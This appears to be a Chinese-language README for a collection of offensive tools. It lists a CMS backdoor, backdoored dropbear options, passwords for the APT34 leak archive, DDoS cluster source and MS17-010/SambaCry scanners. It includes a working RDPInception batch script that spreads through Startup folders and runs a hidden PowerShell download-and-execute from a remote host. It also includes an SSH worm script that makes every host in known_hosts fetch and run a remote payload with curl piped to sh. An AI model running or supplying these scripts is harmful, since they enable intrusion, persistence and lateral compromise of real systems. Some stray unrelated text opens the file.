# 

北京、上海、重庆、新疆、西藏、云南、青海、湖北
116520+101297=217817+130410=348227
## siteserver cms 5.X vuln demo
SiteServer CMS remote download getshell `demo.zip`下载的后门文件
## 修改OpenSSH源代码记录用户详细操作日志
openssh*.tar.gz 修改后的文件编译安装即可，*.docx为修改说明。
+ https://www.zhoufengjie.cn/?p=385
+ https://www.zhoufengjie.cn/?p=174
## exin.zipEXIN挖矿木马之横向渗透分析
## run.js
Browser-based subdomain bruteforcing using DNS over HTTP(s) (DoH)
## dropbear
+ FAKE_ROOT: #define 强制伪"root"uid解析，即使目标系统无法解析用户名。
+ ALT_SHELL: #define 假冒root用户使用备用shell而不是/bin/sh登陆。
+ Server Master Password: 在dropbear命令行上指定-Y以指定要进行身份验证的“主”密码，当没有root用户时，对FAKE_ROOT很有用，因此没有root密码。
+ Forced Home Directory: 在dropbear命令行上指定-H，以使用户使用指定的主目录登录。当没有root用户时，对FAKE_ROOT很有用，因此没有root主目录。
```
wget https://matt.ucc.asn.au/dropbear/releases/dropbear-2018.76.tar.bz2
tar xjf dropbear-2018.76.tar.bz2
cd dropbear-2018.76
./configure --disable-zlib
make
make install
mkdir /etc/dropbear
/usr/local/bin/dropbearkey -t dss -f /etc/dropbear/dropbear_dss_host_key
/usr/local/bin/dropbearkey -t rsa -s 4096 -f /etc/dropbear/dropbear_rsa_host_key
/usr/local/sbin/dropbear -p 6666
```

## APT34-Leak

Pass: `vJrqJeJo2n005FF*`

+ Glimpse（Palo Alto Networks命名为BondUpdater的基于PowerShell的木马的新版本）
+ PoisonFrog（旧版BondUpdater）
+ HyperShell（Palo Alto Networks称之为TwoFace的网络外壳）
+ HighShell（另一个Web shell）
+ Fox Panel（网络钓鱼套件）
+ Webmask（DNS隧道，DNSpionage背后的主要工具）

## RDPInception
Bat To Exe转换器添加如下代码保存`windows.bat`
```
@echo off

echo Updating Windows ...

@echo off
timeout 1 >nul 2>&1

mkdir \\tsclient\c\temp >nul 2>&1
mkdir C:\temp >nul 2>&1

copy windows.exe C:\temp >nul 2>&1
copy windows.exe \\tsclient\c\temp >nul 2>&1

del /q %TEMP%\temp_00.txt >nul 2>&1

set dirs=dir /a:d /b /s C:\users\*Startup*
set dirs2=dir /a:d /b /s \\tsclient\c\users\*startup*

echo|%dirs%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"
echo|%dirs2%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"

for /F "tokens=*" %%a in (%TEMP%\temp_00.txt) DO (
	copy windows.exe "%%a" >nul 2>&1
	copy C:\temp\windows.exe "%%a" >nul 2>&1
	copy \\tsclient\c\temp\windows.exe "%%a" >nul 2>&1
)

del /q %TEMP%\temp_00.txt >nul 2>&1

powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x'))"
```
选项：

+ 工作目录：当前
+ EXE格式：32位windows隐藏
+ 嵌入式提取到：临时目录

转换bat保存为`windows.exe`,编辑`windows.bat`嵌入添加`windows.exe`重新转换为最终成品windows.exe

## kali_beef_start
Kali Beef Framework Start Script

## SambaCry漏洞扫描程序
存档的密码:`sambacry` <br>
参考:https://bi.zone/news/vulnerability-scanner-sambacry/

## WannaCry漏洞扫描程序MS17-010
存档的密码:`wannacry` <br>
参考:https://bi.zone/news/vulnerability-scanner-ms17-010/

## kali开启SSH服务，允许root登陆
```
systemctl enable ssh.service	//开启SSH服务开机启动
```
`nano /etc/ssh/sshd_config`允许root登陆
```
#PermitRootLogin prohibit-password
PermitRootLogin yes
#PasswordAuthentication yes
PasswordAuthentication yes
```
## kali设置固定ip
1.首先把kali虚拟机的**网络适配器**更改为**桥接模式**直连物理网络。<br>
2.查看自己主机的（是自己真实电脑的不是虚拟机）ip地址，网关，网段。<br>
3.修改`nano /etc/network/interfaces`文件，添加如下内容
```
auto eth0	//自动启动eth0网卡
iface eth0 inet static	//静态获取IP
address x.x.x.x	//固定ip地址，根据实际情况填写
netmask x.x.x.x	//子网掩码，根据实际情况填写
gateway x.x.x.x	//网关，根据实际情况填写
```
4.修改`nano /etc/resolv.conf`文件添加dns
```
nameserver 114.114.114.114
nameserver 8.8.8.8
```
5.重启系统或`/etc/init.d/networking restart`重启网络服务

## Puzlbox PHP模糊测试工具。
它通过执行动态程序分析来扫描几个不同的漏洞.目前正在进行以下测试：

+ 任意命令执行
+ 任意文件读/写/更改/重命名/删除
+ 本地文件包含（LFI）
+ 任意PHP执行
+ SQL注入
+ 反射的跨站点脚本（XSS）

对于每个测试，将特定有效负载（伪造请求）发送到Web应用程序，并分析来自服务器的响应。根据结果​​（HTTP响应代码，错误，......），测试将被解释为正面（发现潜在的漏洞）或负面。所有肯定测试都出现在生成的报告中，并带有已发送的有效负载

puzlbox [-s Server（默认本地主机）] [-m扫描模式（默认CFLPSX）] [绝对Web根目录] [-n No Unhook] [应用程序路径（以逗号分隔）]

## linux ddos集群源码

存档的密码:`123` <br>linux集群源码_2.7z 

## XSSHunter-Setup安装教程
`XSSHunter-Setup`安装教程文章

## ssh批量执行命令
```
#!/bin/sh
export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin

if [ -f /root/.ssh/known_hosts ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "curl -fsSL http://x.x.x.x/z0.txt | sh";done
fi

for file in /home/*
do
    if test -d $file; then
        if [ -f $file/.ssh/known_hosts ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h "curl -fsSL http://x.x.x.x/z0.txt | sh";done
        fi
    fi
done
```
